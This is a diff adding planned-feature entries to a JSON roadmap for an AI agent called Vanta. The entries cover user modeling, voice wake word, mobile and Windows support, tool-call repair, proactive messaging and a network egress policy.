+    {
+      "id": "USER-MODEL-DIALECTIC",
+      "track": "Operator",
+      "title": "Dialectic user modeling — a deepening model of who you are (Honcho-style)",
+      "status": "next",
+      "size": "L",
+      "summary": "Hermes uses Honcho dialectic user modeling to build a deepening theory-of-the-user across sessions. Vanta has operator-profile + brain user_model; upgrade to a dialectic loop that forms, tests, and revises explicit beliefs about the user's preferences/goals/working-style from real interactions, feeding the prompt + approvals.",
+      "done": "Across sessions, Vanta forms and revises explicit, inspectable beliefs about the user that measurably change its behavior, with provenance and a way to see/correct them.",
+      "tier": "rock",
+      "lens": "memory",
+      "source": "hermes-openclaw-audit-2026-06-21"
+    },
+    {
+      "id": "TRAJECTORY-TOOLING",
+      "track": "Harness",
+      "title": "Batch trajectory generation + compression for training tool-calling models",
+      "status": "horizon",
+      "size": "L",
+      "summary": "Hermes' research edge (it is a model lab): generate batches of agent trajectories and compress them to train next-gen tool-calling models. Lower priority for Vanta (not a model lab) but valuable for a personal tool-calling model + evals. Pairs with PERSONAL-MODEL-TUNE (LoRA).",
+      "done": "Vanta exports batches of its own task trajectories in a training-ready format and compresses them, feeding a fine-tune (e.g. the LoRA path); demonstrated on a small real batch.",
+      "tier": "pebble",
+      "lens": "selfhood",
+      "source": "hermes-openclaw-audit-2026-06-21",
+      "after": [
+        "PERSONAL-MODEL-TUNE"
+      ]
+    },
+    {
+      "id": "VOICE-WAKE-WORD",
+      "track": "Operator",
+      "title": "Wake word — hands-free 'Hey Vanta' always-listening trigger",
+      "status": "next",
+      "size": "M",
+      "summary": "Voice STT today is push-to-talk. Add an always-listening wake word ('Hey Vanta') that opens the mic hands-free, like OpenClaw's voice-wake / Hermes talk mode — the Jarvis 'just say it' trigger. Local wake detection, privacy-first (no audio leaves the device until the wake fires).",
+      "done": "Speaking the wake phrase opens a listening turn hands-free on at least macOS; detection runs locally; false-trigger rate is acceptable in normal speech; opt-in and easily disabled.",
+      "tier": "rock",
+      "lens": "reach",
+      "source": "vision-gap-audit-2026-06-21",
+      "after": [
+        "VANTA-VOICE-STT"
+      ]
+    },
+    {
+      "id": "COMPANION-PRESENCE",
+      "track": "Operator",
+      "title": "Ambient presence — macOS menu-bar + mobile companion node",
+      "status": "next",
+      "size": "L",
+      "summary": "Vanta has an Electron desktop app but isn't ambient. Add a menu-bar/tray presence (quick ask, status, recent activity, approve-from-tray) and a lightweight mobile companion node — so Vanta is always reachable, like OpenClaw's Windows Hub / macOS menu bar / mobile nodes. Jarvis is present, not launched.",
+      "done": "A macOS menu-bar app shows status + lets you ask/approve without opening a terminal; a mobile node can reach the running gateway; both gate actions through the kernel.",
+      "tier": "rock",
+      "lens": "reach",
+      "source": "vision-gap-audit-2026-06-21"
+    },
+    {
+      "id": "TOOL-CALL-REPAIR",
+      "track": "Harness",
+      "title": "Tool-call repair — auto-fix malformed tool calls (weak/local models)",
+      "status": "next",
+      "size": "M",
+      "summary": "OpenClaw ships a tool-call-repair layer that fixes malformed/partial tool calls before they fail. Vanta targets local + weaker models (Ollama, small open models) where this matters most — repair the JSON/args (coerce types, fill defaults, fix truncation) so a fumbled call retries clean instead of wasting a turn. Reliability for the real-operator bar.",
+      "done": "A representative malformed tool call from a weak/local model is repaired and executed instead of erroring; repair is logged; measured drop in tool-call failures on a local model.",
+      "tier": "rock",
+      "lens": "agent-loop",
+      "source": "vision-gap-audit-2026-06-21"
+    },
+    {
+      "id": "VANTA-CANVAS",
+      "track": "Operator",
+      "title": "Visual canvas — a surface the agent draws/builds on (beyond text)",
+      "status": "next",
+      "size": "L",
+      "summary": "OpenClaw has a Live Canvas / A2UI. For an operator that 'builds things', text is a ceiling — add a canvas the agent can render to: charts, tables, UI mockups, diffs, live artifacts, a previewable build output. Surfaces in the desktop app + companion presence.",
+      "done": "The agent can render a structured visual artifact (e.g. a chart, table, or UI preview) to a canvas the user can see and interact with, driven by a tool call, kernel-gated.",
+      "tier": "rock",
+      "lens": "tui",
+      "source": "vision-gap-audit-2026-06-21"
+    },
+    {
+      "id": "PROACTIVE-CHANNEL-OUTREACH",
+      "track": "Operator",
+      "title": "Proactive outreach — Vanta messages you first on a channel",
+      "status": "next",
+      "size": "M",
+      "summary": "KAIROS proactivity + nudge cadence exist internally, but Vanta doesn't reach OUT on a channel on its own. Make it initiate: briefings, alerts, 'you should look at X', finished-task pings — delivered to Telegram/WhatsApp/etc., throttled and budget-bounded. The Jarvis 'Sir, you have a meeting' behaviour. Strictly opt-in and rate-limited.",
+      "done": "On a real trigger (schedule, watcher, or finished autonomous task), Vanta sends an unprompted message to a configured channel, within throttle + budget limits, opt-in and easy to silence.",
+      "tier": "rock",
+      "lens": "reach",
+      "source": "vision-gap-audit-2026-06-21",
+      "after": [
+        "MSG-MULTICHANNEL-LIVE"
+      ]
+    },
+    {
+      "id": "NET-EGRESS-POLICY",
+      "track": "Harness",
+      "title": "Network egress policy — allow/deny for all outbound, not just hooks",
+      "status": "next",
+      "size": "M",
+      "summary": "VANTA-HOOK-SSRF-GUARD blocks private/metadata IPs for HTTP hooks only. Generalize it (OpenClaw's net-policy steal) into a first-class egress policy across ALL outbound — tools, fetch, browser, MCP — with an allow/deny list, private-range/metadata blocking by default, and per-domain rules. The kernel gates actions; this gates where bytes go.",
+      "done": "All outbound network paths (web_fetch, browser, MCP, tools) route through one egress policy that blocks private/metadata ranges by default and honors an allow/deny list; bypass attempts are denied + logged.",
+      "tier": "pebble",
+      "lens": "infra",
+      "source": "vision-gap-audit-2026-06-21",
+      "after": [
+        "VANTA-HOOK-SSRF-GUARD"
+      ]
+    },
+    {
+      "id": "PLATFORM-MOBILE-TERMUX",
+      "track": "Harness",
+      "title": "Mobile install — Android / Termux path (Vanta in your pocket)",
+      "status": "next",
+      "size": "L",
+      "summary": "Hermes installs on Android via Termux with a curated extras set (full deps pull Android-incompatible voice libs). Add a tested Termux install path + a curated dependency profile so Vanta runs on a phone — part of 'reaches you everywhere'. Pairs with the mobile companion node.",
+      "done": "A documented Termux install brings up the CLI + gateway on Android with a curated dep set; a basic task runs end-to-end on-device; voice/heavy deps degrade gracefully.",
+      "tier": "pebble",
+      "lens": "infra",
+      "source": "vision-gap-audit-2026-06-21",
+      "after": [
+        "INSTALL-PARITY"
+      ]
+    },
+    {
+      "id": "PLATFORM-WINDOWS",
+      "track": "Harness",
+      "title": "Native Windows support — CLI / gateway / tools without WSL",
+      "status": "horizon",
+      "size": "L",
+      "summary": "Hermes and OpenClaw run natively on Windows (bundled Git Bash, PowerShell installer). Vanta is mac/Linux-first. Native Windows (CLI, gateway, TUI, tools, a portable shell for shell_cmd) widens reach to most desktop users. Lower priority for a mac-first solo build, but on the path to broad beta.",
+      "done": "On a clean Windows box, a one-line installer brings up Vanta natively (no WSL required); CLI, gateway, and shell-based tools work; `vanta doctor` is green.",
+      "tier": "pebble",
+      "lens": "infra",
+      "source": "vision-gap-audit-2026-06-21",
+      "after": [
+        "INSTALL-PARITY"
+      ]
     }
   ]
 }
